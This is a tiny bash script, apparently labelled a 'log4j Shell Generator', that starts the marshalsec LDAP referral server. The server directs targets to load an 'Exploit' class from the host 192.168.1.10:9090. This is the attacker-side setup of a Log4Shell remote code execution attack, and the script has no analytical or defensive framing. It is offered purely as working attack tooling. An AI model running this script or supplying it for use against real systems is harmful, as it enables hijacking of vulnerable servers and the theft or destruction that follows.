#!/bin/bash
# RealRadioactive log4j Shell Generator
# Coded and edit by: https://github.com/Realradioactive
 
echo "server ip:"192.168.1.10 
echo "server port:"9090 
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.1.10:9090/#Exploit" 
